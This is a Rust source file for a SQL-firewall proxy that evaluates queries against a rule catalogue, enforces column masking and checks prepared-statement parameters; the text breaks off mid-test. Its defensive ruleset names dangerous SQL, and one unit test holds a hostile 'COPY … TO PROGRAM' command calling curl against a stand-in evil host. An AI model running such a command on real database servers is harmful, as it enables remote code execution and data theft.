//! Bridge between the TCP proxy and the AST evaluation engine (in-process).
//!
//! The TCP proxy calls the existing parser and `RuleEngine` directly, without
//! going through HTTP. This keeps latency minimal on the critical path.

use vericto_engine::parser::{Dialect, parser_for};
use vericto_engine::{
    Decision, EnforcementAction, EnforcementPolicy, EvaluationOutcome, ParseErrorAction,
    ReportedViolation, Rule, RuleEngine, RuleType, SensitivePolicy, Severity, TouchedColumn,
};

use crate::tcp::protocol::QueryKind;

/// Rule code of every sensitive-column outcome (engine contract §3.1), including
/// the proxy's own fail-safe blocks below.
pub const SENSITIVE_RULE_CODE: &str = "VERICTO-085";

/// Result of evaluating a query on the TCP path.
pub enum TcpDecision {
    /// Forward to the real DB. `observation` carries violation info when the
    /// action was Flag or Monitor (for telemetry), the parse-error allow-report
    /// observation, or None when no rule matched.
    Forward {
        observation: Option<Observation>,
        /// Every rule the query violated, winner first. Carried alongside the
        /// observation rather than inside it because a parse-error observation has
        /// no engine violations to report.
        violations: Vec<ReportedViolation>,
        /// The SQL to send INSTEAD of the original: a `mask` tag was applied
        /// (Postgres and MySQL). When `Some`, the session forwards this text and never
        /// the original; `evaluate` has already checked it is consistent.
        rewritten_query: Option<String>,
        /// Every tagged column the query reads (VERICTO-085), for the audit trail.
        sensitive_columns: Vec<TouchedColumn>,
    },
    /// Reject the query with SQLSTATE 42501.
    Block {
        rule_code: String,
        ast_node_path: String,
        suggested_safe_query: Option<String>,
        severity: Severity,
        /// Every rule the query violated, winner first. The block itself is
        /// decided by the winner alone; this is the audit trail, and reporting it
        /// cannot change the decision.
        violations: Vec<ReportedViolation>,
        /// Every tagged column the query would have read (VERICTO-085).
        sensitive_columns: Vec<TouchedColumn>,
    },
}

impl TcpDecision {
    /// A block raised by the proxy itself because a mask could not be enforced
    /// as the engine described it. Never forwards anything: the alternative to a
    /// rewrite the proxy cannot trust is the unmasked original.
    fn sensitive_block(
        reason: &str,
        violations: Vec<ReportedViolation>,
        sensitive_columns: Vec<TouchedColumn>,
    ) -> Self {
        TcpDecision::Block {
            rule_code: SENSITIVE_RULE_CODE.to_string(),
            ast_node_path: format!("SensitiveColumn > mask not enforceable by the proxy: {reason}"),
            suggested_safe_query: None,
            // The engine's severity for a block or mask outcome (contract §3.1).
            severity: Severity::High,
            violations,
            sensitive_columns,
        }
    }
}

/// A non-blocking violation (or parse-error allow-report) recorded for telemetry.
pub struct Observation {
    pub rule_code: String,
    pub ast_node_path: String,
    pub severity: Severity,
    /// Flag | Monitor (or Flag for a parse-error allow_report observation).
    pub action: EnforcementAction,
    /// Some when this is a parse-error observation; carries the parser message.
    pub parse_error: Option<String>,
}

/// Evaluates a SQL query against the given ruleset, resolving the winning
/// violation's action via the workspace `policy`.
///
/// - Parse OK → `RuleEngine::evaluate`; `Decision::Block` maps to `Block`,
///   `Decision::Flag`/`Decision::Allow` map to `Forward` carrying an
///   `Observation` built from the resolved action (None when no rule matched).
///   A `Forward` carries the engine's `rewritten_query` when a mask applied;
///   if the outcome does not hold together (see [`rewrite_inconsistency`]) the
///   query is blocked instead.
/// - Parse error → resolved from `policy.effective_parse_error()`:
///   `AllowReport` (fail-open default) forwards with a parse-error
///   `Observation`; `Block` (fail-closed opt-in, and forced by any `block` or
///   `mask` sensitive column) rejects with `VERICTO-PARSE-ERROR`.
pub fn evaluate(
    sql: &str,
    dialect: Dialect,
    rules: &[Rule],
    policy: &EnforcementPolicy,
) -> TcpDecision {
    let parser = parser_for(dialect);
    match parser.parse(sql) {
        Ok(parsed) => {
            let outcome = RuleEngine::evaluate(&parsed, rules, policy);
            if outcome.decision != Decision::Block
                && let Some(reason) = rewrite_inconsistency(&outcome, dialect, policy)
            {
                tracing::error!(
                    reason,
                    "sensitive-column outcome is inconsistent; blocking rather than forwarding"
                );
                return TcpDecision::sensitive_block(
                    reason,
                    outcome.violations,
                    outcome.sensitive_columns,
                );
            }
            match outcome.decision {
                Decision::Block => TcpDecision::Block {
                    rule_code: outcome.rule_code.unwrap_or_else(|| "VERICTO".to_string()),
                    ast_node_path: outcome.ast_node_path.unwrap_or_default(),
                    suggested_safe_query: outcome.suggested_safe_query,
                    severity: outcome.severity.unwrap_or(Severity::Critical),
                    violations: outcome.violations,
                    sensitive_columns: outcome.sensitive_columns,
                },
                Decision::Flag | Decision::Allow => TcpDecision::Forward {
                    observation: outcome.action.map(|action| Observation {
                        rule_code: outcome
                            .rule_code
                            .clone()
                            .unwrap_or_else(|| "VERICTO".to_string()),
                        ast_node_path: outcome.ast_node_path.clone().unwrap_or_default(),
                        severity: outcome.severity.unwrap_or(Severity::Medium),
                        action,
                        parse_error: None,
                    }),
                    violations: outcome.violations,
                    rewritten_query: outcome.rewritten_query,
                    sensitive_columns: outcome.sensitive_columns,
                },
            }
        }
        // `effective_parse_error`, not the raw `parse_error`: with a `block` or
        // `mask` tag configured a query the engine cannot read cannot be shown not
        // to read the column, so it blocks whatever the workspace chose (engine
        // contract §3.2). Without such tags the two are identical.
        Err(e) => match policy.effective_parse_error() {
            // Fail-open default (R5.5): forward + report.
            ParseErrorAction::AllowReport => TcpDecision::Forward {
                // A query that did not parse violated no rule: there is nothing to
                // enumerate, and the parse error itself travels in the observation.
                violations: Vec::new(),
                observation: Some(Observation {
                    rule_code: "VERICTO-PARSE-ERROR".to_string(),
                    ast_node_path: format!("PARSE_ERROR: {e}"),
                    // Parse-error telemetry severity is Medium by product decision (R8.6).
                    severity: Severity::Medium,
                    action: EnforcementAction::Flag,
                    parse_error: Some(e.to_string()),
                }),
                rewritten_query: None,
                sensitive_columns: Vec::new(),
            },
            // Fail-closed (R5.6): reject with 42501.
            ParseErrorAction::Block => TcpDecision::Block {
                rule_code: "VERICTO-PARSE-ERROR".to_string(),
                ast_node_path: format!("PARSE_ERROR: {e}"),
                suggested_safe_query: None,
                severity: Severity::Medium,
                violations: Vec::new(),
                sensitive_columns: Vec::new(),
            },
        },
    }
}

/// [`evaluate`], plus the checks that depend on how the query arrived.
///
/// A prepared statement (Postgres `Parse`, MySQL `COM_STMT_PREPARE`) is
/// followed by values the client binds to the parameters of the statement it
/// sent. A rewrite that changes those parameters no longer fits the client's
/// `Bind` / `COM_STMT_EXECUTE`, so it is refused here, with a message that says
/// why, instead of forwarding a statement that fails later with a confusing
/// protocol error (or, on MySQL, binds a value to the wrong `?`). The engine
/// keeps every parameter (3.6.1 for `$n`, 3.7.0 for `?`); this is the proxy not
/// taking that on trust. Checked before telemetry so the event records what
/// actually happened.
pub fn evaluate_message(
    sql: &str,
    dialect: Dialect,
    kind: QueryKind,
    rules: &[Rule],
    policy: &EnforcementPolicy,
) -> TcpDecision {
    checked_for_kind(evaluate(sql, dialect, rules, policy), sql, dialect, kind)
}

/// The parameter check of [`evaluate_message`] on an already evaluated query.
fn checked_for_kind(
    decision: TcpDecision,
    sql: &str,
    dialect: Dialect,
    kind: QueryKind,
) -> TcpDecision {
    match decision {
        TcpDecision::Forward {
            rewritten_query: Some(ref rewritten),
            ..
        } if kind == QueryKind::Prepared => match parameter_mismatch(sql, rewritten, dialect) {
            None => decision,
            Some(reason) => {
                let TcpDecision::Forward {
                    violations,
                    sensitive_columns,
                    ..
                } = decision
                else {
                    unreachable!()
                };
                TcpDecision::sensitive_block(&reason, violations, sensitive_columns)
            }
        },
        other => other,
    }
}

/// Why an engine outcome that is not a block cannot be enforced as it stands,
/// or `None` when it can. Any `Some` blocks the query: every way of being
/// inconsistent leaves the proxy with only the original SQL to forward, which is
/// exactly what a mask tag forbids.
///
/// The engine guarantees none of these happen (contract §3.2/§3.3); this is the
/// proxy not taking that on trust for the one decision where trusting it wrongly
/// leaks the column.
fn rewrite_inconsistency(
    outcome: &EvaluationOutcome,
    dialect: Dialect,
    policy: &EnforcementPolicy,
) -> Option<&'static str> {
    let masked = outcome
        .sensitive_columns
        .iter()
        .any(|c| c.policy == SensitivePolicy::Mask);
    match &outcome.rewritten_query {
        Some(_) if !matches!(dialect, Dialect::Postgres | Dialect::Mysql) => {
            Some("a rewritten query was returned for a dialect the rewrite does not support")
        }
        Some(_) if !masked => Some("a rewritten query was returned but no masked column was read"),
        Some(sql) if sql.trim().is_empty() || sql.contains('\0') => {
            Some("the rewritten query is empty or not valid wire text")
        }
        Some(_) => None,
        // monitor_mode is the one case where a masked read legitimately forwards
        // the original: dry-run never changes what runs (contract §3.2).
        None if masked && !policy.monitor_mode => {
            Some("a masked column was read but no rewritten query was returned")
        }
        None => None,
    }
}

/// `$n` placeholders of a Postgres statement, sorted and deduplicated. `None`
/// when it does not parse.
fn placeholders(sql: &str) -> Option<Vec<i32>> {
    let parsed = pg_query::parse(sql).ok()?;
    let mut n: Vec<i32> = parsed
        .protobuf
        .nodes()
        .into_iter()
        .filter_map(|(node, ..)| match node {
            pg_query::NodeRef::ParamRef(p) => Some(p.number),
            _ => None,
        })
        .collect();
    n.sort_unstable();
    n.dedup();
    Some(n)
}

/// Number of `?` parameters of a MySQL statement, counted with the MySQL lexer
/// (as the server counts them: not inside a string, a quoted identifier or a
/// comment). `None` when it does not lex.
fn mysql_placeholders(sql: &str) -> Option<usize> {
    let tokens = sqlparser::tokenizer::Tokenizer::new(&sqlparser::dialect::MySqlDialect {}, sql)
        .tokenize()
        .ok()?;
    Some(
        tokens
            .iter()
            .filter(
                |t| matches!(t, sqlparser::tokenizer::Token::Placeholder(p) if p.starts_with('?')),
            )
            .count(),
    )
}

/// Why `rewritten` cannot be bound with the parameters the client prepared
/// `original` for, or `None` when it can.
fn parameter_mismatch(original: &str, rewritten: &str, dialect: Dialect) -> Option<String> {
    match dialect {
        Dialect::Mysql => mysql_parameter_mismatch(original, rewritten),
        _ => postgres_parameter_mismatch(original, rewritten),
    }
}

/// MySQL `?` are positional: the server reports their count in
/// COM_STMT_PREPARE_OK and the client binds that many values, in order. The
/// engine keeps them in order (contract §10.3); the proxy checks the count,
/// which is what the client's COM_STMT_EXECUTE depends on.
fn mysql_parameter_mismatch(original: &str, rewritten: &str) -> Option<String> {
    let (Some(before), Some(after)) = (mysql_placeholders(original), mysql_placeholders(rewritten))
    else {
        return Some("the rewritten statement could not be checked for parameters".to_string());
    };
    (before != after).then(|| {
        format!(
            "masking changes the number of `?` parameters from {before} to {after}, so the \
             values the client binds would no longer fit; select the column itself, or compute \
             on it without a parameter"
        )
    })
}

fn postgres_parameter_mismatch(original: &str, rewritten: &str) -> Option<String> {
    let (Some(before), Some(after)) = (placeholders(original), placeholders(rewritten)) else {
        return Some("the rewritten statement could not be checked for parameters".to_string());
    };
    if before == after {
        return None;
    }
    let lost: Vec<String> = before
        .iter()
        .filter(|n| !after.contains(n))
        .map(|n| format!("${n}"))
        .collect();
    Some(if lost.is_empty() {
        "the rewritten statement has different parameters".to_string()
    } else {
        format!(
            "masking removes parameter {} (it is used inside a masked expression); \
             select the column itself, or compute on it without a parameter",
            lost.join(", ")
        )
    })
}

/// Default ruleset: the built-in rules with their canonical severity and
/// recommended `default_action` (verbatim from the R13 table). It is the
/// engine's whole catalogue (pinned by `default_ruleset_has_the_engine_catalogue`).
///
/// In production this ruleset would be resolved per workspace (querying the
/// API or database based on the `database` from the StartupMessage). For
/// single-tenant / dev mode these built-ins are the safe minimum.
pub fn default_ruleset() -> Vec<Rule> {
    // (code, severity, default_action) — verbatim from the R13 table.
    let rules: &[(&str, Severity, EnforcementAction)] = &[
        // Destructive-critical (Critical / BLOCK).
        ("VERICTO-001", Severity::Critical, EnforcementAction::Block), // DELETE without WHERE
        ("VERICTO-003", Severity::Critical, EnforcementAction::Block), // DELETE with always-true WHERE
        ("VERICTO-010", Severity::Critical, EnforcementAction::Block), // DROP TABLE / DATABASE
        ("VERICTO-011", Severity::Critical, EnforcementAction::Block), // TRUNCATE TABLE
        ("VERICTO-012", Severity::Critical, EnforcementAction::Block), // DROP SCHEMA
        ("VERICTO-030", Severity::Critical, EnforcementAction::Block), // UPDATE without WHERE (primary tables)
        ("VERICTO-042", Severity::Critical, EnforcementAction::Block), // UPDATE without WHERE
        ("VERICTO-090", Severity::Critical, EnforcementAction::Block), // OR tautology in WHERE (SQL injection)
        ("VERICTO-080", Severity::Critical, EnforcementAction::Block), // COPY … TO/FROM PROGRAM (server-side RCE)
        ("VERICTO-081", Severity::Critical, EnforcementAction::Block), // DO $$ … $$ anonymous code block
        // MySQL text the engine and MySQL would read differently. Engine-driven: the
        // engine blocks it whatever this list holds; listed so the catalogue is whole.
        ("VERICTO-086", Severity::Critical, EnforcementAction::Block),
        // High / BLOCK.
        ("VERICTO-002", Severity::High, EnforcementAction::Block), // DELETE with LIMIT 0 (MySQL)
        ("VERICTO-013", Severity::High, EnforcementAction::Block), // DROP INDEX without IF EXISTS
        ("VERICTO-015", Severity::High, EnforcementAction::Block), // ALTER TABLE DROP COLUMN
        ("VERICTO-016", Severity::High, EnforcementAction::Block), // ALTER TABLE RENAME
        ("VERICTO-017", Severity::High, EnforcementAction::Block), // ALTER TABLE DROP CONSTRAINT
        ("VERICTO-018", Severity::High, EnforcementAction::Block), // ALTER TABLE ALTER COLUMN TYPE
        ("VERICTO-019", Severity::High, EnforcementAction::Block), // ALTER TABLE DISABLE TRIGGER / RLS
        ("VERICTO-031", Severity::High, EnforcementAction::Block), // UPDATE in CTE without WHERE
        ("VERICTO-033", Severity::High, EnforcementAction::Block), // DELETE in subquery without WHERE
        ("VERICTO-040", Severity::High, EnforcementAction::Block), // INSERT INTO … SELECT without filter
        ("VERICTO-070", Severity::High, EnforcementAction::Block), // SLEEP() / PG_SLEEP()
        ("VERICTO-082", Severity::High, EnforcementAction::Block), // GRANT / REVOKE
        ("VERICTO-083", Severity::High, EnforcementAction::Block), // MERGE (mass mutation)
        ("VERICTO-084", Severity::High, EnforcementAction::Block), // CREATE TABLE AS SELECT (bulk copy)
        // Read of a sensitive column. Engine-driven: it only acts on the policy's
        // column tags (High for block/mask, Medium for flag), never through this list.
        ("VERICTO-085", Severity::High, EnforcementAction::Block),
        // Medium / FLAG.
        ("VERICTO-050", Severity::Medium, EnforcementAction::Flag), // SELECT without LIMIT
        ("VERICTO-051", Severity::Medium, EnforcementAction::Flag), // SELECT * without WHERE
        ("VERICTO-061", Severity::Medium, EnforcementAction::Flag), // INSERT batch > 10k rows
        // Low / MONITOR.
        ("VERICTO-060", Severity::Low, EnforcementAction::Monitor), // INSERT without explicit columns
    ];

    rules
        .iter()
        .map(|(code, severity, default_action)| Rule {
            rule_id: code.to_string(),
            code: code.to_string(),
            severity: *severity,
            default_action: *default_action,
            rule_type: RuleType::Standard,
            ast_condition_yaml: None,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    // The R13 table (code, severity, default_action) — the authoritative source
    // of truth. `default_ruleset()` must match this verbatim (task 5.9).
    const R13: &[(&str, Severity, EnforcementAction)] = &[
        ("VERICTO-001", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-003", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-010", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-011", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-012", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-030", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-042", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-090", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-080", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-081", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-086", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-002", Severity::High, EnforcementAction::Block),
        ("VERICTO-013", Severity::High, EnforcementAction::Block),
        ("VERICTO-015", Severity::High, EnforcementAction::Block),
        ("VERICTO-016", Severity::High, EnforcementAction::Block),
        ("VERICTO-017", Severity::High, EnforcementAction::Block),
        ("VERICTO-018", Severity::High, EnforcementAction::Block),
        ("VERICTO-019", Severity::High, EnforcementAction::Block),
        ("VERICTO-031", Severity::High, EnforcementAction::Block),
        ("VERICTO-033", Severity::High, EnforcementAction::Block),
        ("VERICTO-040", Severity::High, EnforcementAction::Block),
        ("VERICTO-070", Severity::High, EnforcementAction::Block),
        ("VERICTO-082", Severity::High, EnforcementAction::Block),
        ("VERICTO-083", Severity::High, EnforcementAction::Block),
        ("VERICTO-084", Severity::High, EnforcementAction::Block),
        ("VERICTO-085", Severity::High, EnforcementAction::Block),
        ("VERICTO-050", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-051", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-061", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-060", Severity::Low, EnforcementAction::Monitor),
    ];

    // Task 5.9 — default_ruleset() matches the R13 table verbatim.
    #[test]
    fn default_ruleset_matches_r13_table_verbatim() {
        let ruleset = default_ruleset();
        assert_eq!(
            ruleset.len(),
            R13.len(),
            "default_ruleset() must have exactly the R13 entries"
        );
        for (rule, (code, severity, action)) in ruleset.iter().zip(R13.iter()) {
            assert_eq!(&rule.code, code, "rule code mismatch");
            assert_eq!(&rule.rule_id, code, "rule_id should equal the code");
            assert_eq!(rule.severity, *severity, "severity mismatch for {code}");
            assert_eq!(
                rule.default_action, *action,
                "default_action mismatch for {code}"
            );
        }
    }

    /// Source directory of the `vericto-engine` this crate is built against: the
    /// git checkout of the commit `Cargo.lock` pins. Found without `cargo metadata`
    /// first, because `cargo metadata --offline` needs every package of the graph
    /// downloaded, including other platforms' (CI only fetches the host's), and
    /// fails there. Falls back to `cargo metadata` for a non-default CARGO_HOME layout.
    fn engine_source_dir() -> std::path::PathBuf {
        let manifest_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let lock =
            std::fs::read_to_string(manifest_dir.join("Cargo.lock")).expect("read Cargo.lock");
        let rev = lock
            .split("[[package]]")
            .find(|p| p.contains("name = \"vericto-engine\""))
            .and_then(|p| p.lines().find(|l| l.starts_with("source = ")))
            .and_then(|l| {
                l.trim_end_matches('"')
                    .rsplit('#')
                    .next()
                    .map(str::to_owned)
            })
            .expect("vericto-engine git source in Cargo.lock");
        let cargo_home = std::env::var_os("CARGO_HOME")
            .map(std::path::PathBuf::from)
            .or_else(|| std::env::var_os("HOME").map(|h| std::path::Path::new(&h).join(".cargo")))
            .expect("CARGO_HOME or HOME");
        let checkouts = cargo_home.join("git").join("checkouts");
        if let Ok(entries) = std::fs::read_dir(&checkouts) {
            for e in entries.flatten() {
                if !e
                    .file_name()
                    .to_string_lossy()
                    .starts_with("vericto-engine-")
                {
                    continue;
                }
                let dir = e.path().join(&rev[..7.min(rev.len())]);
                if dir.join("Cargo.toml").is_file() {
                    return dir;
                }
            }
        }
        let cargo = std::env::var("CARGO").unwrap_or_else(|_| "cargo".into());
        let out = std::process::Command::new(cargo)
            .args(["metadata", "--format-version", "1", "--locked"])
            .current_dir(manifest_dir)
            .output()
            .expect("run cargo metadata");
        assert!(
            out.status.success(),
            "cargo metadata failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let meta: serde_json::Value = serde_json::from_slice(&out.stdout).expect("metadata JSON");
        let manifest = meta["packages"]
            .as_array()
            .expect("packages")
            .iter()
            .find(|p| p["name"] == "vericto-engine")
            .and_then(|p| p["manifest_path"].as_str())
            .expect("vericto-engine in the dependency graph");
        std::path::Path::new(manifest)
            .parent()
            .expect("manifest dir")
            .to_path_buf()
    }

    /// The engine's rule catalogue: every `VERICTO-NNN` row of its README, with the
    /// severity of the `### <Severity>` section it is listed under. The engine's own
    /// `rule_catalogue_sync` test keeps that table equal to its evaluator.
    fn engine_catalogue() -> std::collections::BTreeMap<String, Severity> {
        let readme = std::fs::read_to_string(engine_source_dir().join("README.md"))
            .expect("read the engine README");
        let mut severity = None;
        let mut out = std::collections::BTreeMap::new();
        for line in readme.lines() {
            if let Some(h) = line.strip_prefix("### ") {
                severity = match h.trim() {
                    "Critical" => Some(Severity::Critical),
                    "High" => Some(Severity::High),
                    "Medium" => Some(Severity::Medium),
                    "Low" => Some(Severity::Low),
                    "Informational" => Some(Severity::Informational),
                    _ => None,
                };
                continue;
            }
            let Some(row) = line.trim_start().strip_prefix("| VERICTO-") else {
                continue;
            };
            let digits: String = row.chars().take_while(|c| c.is_ascii_digit()).collect();
            if digits.is_empty() || !row[digits.len()..].trim_start().starts_with('|') {
                continue;
            }
            let code = format!("VERICTO-{digits}");
            let sev = severity.unwrap_or_else(|| panic!("{code} is outside a severity section"));
            assert!(
                out.insert(code.clone(), sev).is_none(),
                "{code} listed twice"
            );
        }
        assert!(
            !out.is_empty(),
            "no catalogue rows found in the engine README"
        );
        out
    }

    /// The built-in ruleset is the engine's catalogue: same codes, same
    /// severities, nothing missing and nothing extra. A new engine rule fails
    /// this test until it is added here.
    #[test]
    fn default_ruleset_has_the_engine_catalogue() {
        let engine = engine_catalogue();
        let builtin: std::collections::BTreeMap<String, Severity> = default_ruleset()
            .into_iter()
            .map(|r| (r.code, r.severity))
            .collect();
        let missing: Vec<&String> = engine
            .keys()
            .filter(|c| !builtin.contains_key(*c))
            .collect();
        let extra: Vec<&String> = builtin
            .keys()
            .filter(|c| !engine.contains_key(*c))
            .collect();
        assert!(
            missing.is_empty() && extra.is_empty(),
            "built-in ruleset ({}) differs from the engine catalogue ({}): missing {missing:?}, extra {extra:?}",
            builtin.len(),
            engine.len()
        );
        assert_eq!(
            builtin, engine,
            "severities differ from the engine catalogue"
        );
        assert_eq!(default_ruleset().len(), engine.len(), "no duplicate codes");
    }

    #[test]
    fn default_ruleset_vericto_050_is_medium_flag() {
        let ruleset = default_ruleset();
        let r = ruleset
            .iter()
            .find(|r| r.code == "VERICTO-050")
            .expect("VERICTO-050 present");
        assert_eq!(r.severity, Severity::Medium);
        assert_eq!(r.default_action, EnforcementAction::Flag);
    }

    // ── TcpDecision mapping (task 5.7) ────────────────────────────────────────

    // A DELETE without WHERE (VERICTO-001, Critical/Block) must Block.
    #[test]
    fn block_decision_does_not_forward() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("DELETE FROM users", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-001");
                assert_eq!(severity, Severity::Critical);
            }
            TcpDecision::Forward { .. } => panic!("destructive query must Block, not Forward"),
        }
    }

    // A COPY … TO PROGRAM (VERICTO-080, Critical/Block) must Block via the
    // built-in default_ruleset — proves the new dangerous-statement codes are
    // wired into the proxy's fallback catalogue.
    #[test]
    fn copy_program_blocks_via_default_ruleset() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate(
            "COPY users TO PROGRAM 'curl https://evil.example'",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-080");
                assert_eq!(severity, Severity::Critical);
            }
            TcpDecision::Forward { .. } => panic!("COPY … PROGRAM must Block"),
        }
    }

    // A SELECT without LIMIT (VERICTO-050, Medium/Flag) must Forward with an
    // Observation carrying the Flag action.
    #[test]
    fn flag_decision_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("SELECT * FROM users", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.action, EnforcementAction::Flag);
                assert!(obs.parse_error.is_none());
                assert!(obs.rule_code.starts_with("VERICTO-"));
            }
            TcpDecision::Forward {
                observation: None, ..
            } => {
                panic!("a flagged query must carry an observation")
            }
            TcpDecision::Block { .. } => panic!("a Medium/Flag query must Forward, not Block"),
        }
    }

    // A Low/Monitor rule must Forward with a Monitor observation.
    #[test]
    fn monitor_decision_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        // VERICTO-060: INSERT without explicit column list → Low/Monitor.
        let decision = evaluate(
            "INSERT INTO users VALUES (1, 'a')",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.action, EnforcementAction::Monitor);
                assert!(obs.parse_error.is_none());
            }
            TcpDecision::Forward {
                observation: None, ..
            } => {
                panic!("a monitored query must carry an observation")
            }
            TcpDecision::Block { .. } => panic!("a Low/Monitor query must Forward, not Block"),
        }
    }

    // A query that matches no rule must Forward with no observation (Allow).
    #[test]
    fn allow_decision_forwards_without_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate(
            "SELECT id FROM users WHERE id = 1 LIMIT 10",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Forward { observation, .. } => assert!(
                observation.is_none(),
                "a clean query must not carry an observation"
            ),
            TcpDecision::Block { .. } => panic!("a clean query must Forward, not Block"),
        }
    }

    // Parse error, fail-open (default AllowReport) → Forward + parse-error Observation.
    #[test]
    fn parse_error_fail_open_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("NOT A VALID SQL @@@", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.rule_code, "VERICTO-PARSE-ERROR");
                assert_eq!(obs.action, EnforcementAction::Flag);
                assert_eq!(obs.severity, Severity::Medium);
                assert!(obs.parse_error.is_some());
            }
            _ => panic!("parse-error fail-open must Forward with a parse-error observation"),
        }
    }

    fn tags(json: serde_json::Value) -> EnforcementPolicy {
        EnforcementPolicy {
            sensitive_columns: serde_json::from_value(json).unwrap(),
            ..EnforcementPolicy::default()
        }
    }

    fn mask_email() -> EnforcementPolicy {
        tags(serde_json::json!([
            {"table": "customers", "column": "email", "policy": "mask", "mask_style": "email"}
        ]))
    }

    /// With a block or mask tag, a parse error blocks even under the fail-open
    /// default: the proxy must use `effective_parse_error`, not `parse_error`.
    #[test]
    fn parse_error_with_a_block_or_mask_tag_blocks() {
        for policy in [
            mask_email(),
            tags(serde_json::json!([{"table": "t", "column": "c", "policy": "block"}])),
        ] {
            assert_eq!(policy.parse_error, ParseErrorAction::AllowReport);
            match evaluate(
                "NOT A VALID SQL @@@",
                Dialect::Postgres,
                &default_ruleset(),
                &policy,
            ) {
                TcpDecision::Block { rule_code, .. } => {
                    assert_eq!(rule_code, "VERICTO-PARSE-ERROR")
                }
                TcpDecision::Forward { .. } => {
                    panic!("a parse error must block with a protective tag")
                }
            }
        }
    }

    /// Flag-only tags keep the workspace's fail-open choice.
    #[test]
    fn parse_error_with_only_flag_tags_still_forwards() {
        let policy = tags(serde_json::json!([{"table": "t", "column": "c", "policy": "flag"}]));
        match evaluate(
            "NOT A VALID SQL @@@",
            Dialect::Postgres,
            &default_ruleset(),
            &policy,
        ) {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.rule_code, "VERICTO-PARSE-ERROR")
            }
            _ => panic!("flag-only tags must not change parse-error handling"),
        }
    }

    #[test]
    fn postgres_mask_forwards_the_rewrite_and_the_touched_columns() {
        let d = evaluate(
            "SELECT email FROM customers LIMIT 1",
            Dialect::Postgres,
            &default_ruleset(),
            &mask_email(),
        );
        let TcpDecision::Forward {
            rewritten_query: Some(sql),
            sensitive_columns,
            observation,
            ..
        } = d
        else {
            panic!("a successful mask forwards the rewritten query");
        };
        assert!(sql.contains("regexp_replace"), "{sql}");
        assert_eq!(sensitive_columns.len(), 1);
        assert_eq!(sensitive_columns[0].policy, SensitivePolicy::Mask);
        assert_eq!(observation.unwrap().rule_code, SENSITIVE_RULE_CODE);
    }

    /// Engine 3.7.0 rewrites a MySQL mask too: the proxy forwards the rewrite
    /// (it used to block every MySQL mask with "no rewrite for mysql yet").
    #[test]
    fn mysql_mask_forwards_the_rewrite() {
        for kind in [QueryKind::Simple, QueryKind::Prepared] {
            let d = evaluate_message(
                "SELECT id, email FROM customers WHERE id = ? LIMIT 1",
                Dialect::Mysql,
                kind,
                &default_ruleset(),
                &mask_email(),
            );
            let TcpDecision::Forward {
                rewritten_query: Some(sql),
                sensitive_columns,
                observation,
                ..
            } = d
            else {
                panic!("a successful MySQL mask forwards the rewritten query ({kind:?})");
            };
            assert!(!sql.contains("SELECT id, email FROM"), "{sql}");
            assert_eq!(mysql_placeholders(&sql), Some(1), "{sql}");
            assert_eq!(sensitive_columns.len(), 1);
            assert_eq!(sensitive_columns[0].policy, SensitivePolicy::Mask);
            assert_eq!(observation.unwrap().rule_code, SENSITIVE_RULE_CODE);
        }
    }

    /// A MySQL mask the engine cannot rewrite (`*` over a masked column) still
    /// blocks: there is no rewrite to forward, and the original would leak.
    #[test]
    fn mysql_mask_without_a_rewrite_blocks() {
        match evaluate(
            "SELECT * FROM customers LIMIT 1",
            Dialect::Mysql,
            &default_ruleset(),
            &mask_email(),
        ) {
            TcpDecision::Block {
                rule_code,
                sensitive_columns,
                ..
            } => {
                assert_eq!(rule_code, SENSITIVE_RULE_CODE);
                assert_eq!(sensitive_columns.len(), 1);
            }
            TcpDecision::Forward { .. } => panic!("`*` under mask must block"),
        }
    }

    fn touched(policy: SensitivePolicy) -> TouchedColumn {
        TouchedColumn {
            schema: None,
            table: "customers".into(),
            column: "email".into(),
            policy,
        }
    }

    /// Every outcome that leaves the proxy with only the original to forward
    /// is refused; the consistent ones are not.
    #[test]
    fn inconsistent_mask_outcomes_are_refused() {
        let plain = EnforcementPolicy::default();
        let monitor = EnforcementPolicy {
            monitor_mode: true,
            ..EnforcementPolicy::default()
        };
        let outcome = |rewritten: Option<&str>, cols: Vec<TouchedColumn>| {
            let mut o = EvaluationOutcome::allowed();
            o.decision = Decision::Flag;
            o.rewritten_query = rewritten.map(str::to_string);
            o.sensitive_columns = cols;
            o
        };
